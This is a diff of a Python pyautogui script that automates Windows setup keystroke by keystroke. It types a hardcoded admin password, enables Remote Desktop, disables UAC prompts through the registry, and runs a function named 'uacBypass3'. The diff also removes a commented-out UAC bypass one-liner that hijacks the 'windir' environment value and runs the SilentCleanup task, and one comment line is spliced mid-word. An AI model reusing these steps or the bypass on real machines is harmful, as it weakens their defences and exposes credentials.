@@ -5,7 +5,10 @@ import subprocess
 
 # # Get the ID and security principal of the current user account
 #  $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
-#  $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+#  $myWindowsPrincipal=new-objec
+# admin1!
+# Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+# t System.Security.Principal.WindowsPrincipal($myWindowsID)
 #   
 #  # Get the security principal for the Administrator role
 #  $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
@@ -65,42 +68,65 @@ import subprocess
 # # |
 
 
-# queryList = []
+queryList = []
 
-# def searchFunc(arg):
-#     pag.press('win')
-#     time.sleep(1)
-#     pag.write(arg)
-#     time.sleep(0.5)
+def cmdAdmin():
+    time.sleep(0.5)
+    pag.hotkey("win","r")
+    pag.press("enter")
+    pag.hotkey("ctrl","shift","enter")
+    pag.write("admin1!")
+    
 
-# def launchFileExplorer():
-#     pag.hotkey("win","E")
+
+def searchFunc(arg):
+    time.sleep(0.5)
+    pag.press('win')
+    time.sleep(1)
+    pag.write(arg)
+    time.sleep(0.5)
+
+def launchFileExplorer():
+    pag.hotkey("win","E")
 
 def enableRemoteDesktopSettings():
     #Enable RDP : 1 = Disable ; 0 = Enable
-    pag.write('''Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0''')
+    time.sleep(0.5)
+    pag.write('Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0')
+    pag.press("enter")
+    pag.hotkey("ctrl","up")
+
+def disableRemoteDesktopSettings():
+    #Enable RDP : 1 = Disable ; 0 = Enable
+    time.sleep(0.5)
+    pag.write('Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1')
+    pag.press("enter")
+    pag.hotkey("ctrl","up")
+
+def enableUAC():
+    time.sleep(0.5)
+    pag.write("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 1")
     pag.press("enter")
 
-# def cmdAdmin():
-#     searchFunc("cmd")
-#     pag.hotkey("ctrl","shift","enter")
-#     pag.locateOnScreen('C:/Users/Blake/Desktop/bttn.png')
-#     pag.press("left")
-#     pag.press("enter")
-    
+def disableUAC():
+    time.sleep(0.5)
+    pag.write("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0")
+    pag.press("enter")
+   
+def setTimeDate():
+    time.sleep(0.5)
+    pag.write('tzutil /s "Central Standard Time"')
+    time.sleep(1)
+    pag.press("enter")
 
-# def setTimeDate():
-#     time.sleep(0.5)
-#     cmdAdmin()
-#     pag.hotkey("win","up")
-#     time.sleep(0.5)
-#     pag.write('tzutil /s "Central Standard Time"')
-#     time.sleep(1)
-#     pag.press("enter")
-
-# def setRemoteDesktopSettings():
-#     cmdAdmin()
-#     enableRemoteDesktopSettings()
+def gpUpdate():
+    #Group Policy Update
+    time.sleep(0.5)
+    pag.write('gpupdate /force')
+    pag.press("enter")
+    time.sleep(0.5)
+    pag.write("y")
+    pag.press("enter")
 
 # def disableUAC():
 #     searchFunc("UAC")
@@ -122,31 +148,21 @@ def enableRemoteDesktopSettings():
         
 # # uacBypass2()
 
-# # def uacBypass():
-
-# #     subprocess.call('powershell -command "if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Force} else { $registryPath = "HKCU:\Environment"$Name = "windir"$Value = "powershell -ep bypass -w h $PSCommandPath;#"Set-ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null Remove-ItemProperty -Path $registryPath -Name $name}"')
-
-# # uacBypass2()
-
-
-# # p = subprocess.Popen(["powershell.exe", 
-# #               "C:\\Users\\USER\\Desktop\\helloworld.ps1"], 
-# #               stdout=sys.stdout)
-# # p.communicate()
 
 def uacBypass3():
 #+ ['Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0']
+    time.sleep(0.5)
     subprocess.Popen(["powershell.exe"] + ["runas /netonly /user:RemoteDomain\Administrator powershell"] )
     pag.press("enter")
     pag.write("admin1!")
     pag.press("enter")
-    pag.write('Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0')
-    pag.press("enter")
-    pag.hotkey("ctrl","up")
-    # enableRemoteDesktopSettings()
+    
+    setTimeDate()
+    disableUAC()
+    enableRemoteDesktopSettings()
 
-uacBypass3()
-
+#uacBypass3()
+cmdAdmin()
 
 
 # #List of possible searches: OS, cmd, date and time settings, notifications and settings, check for updates
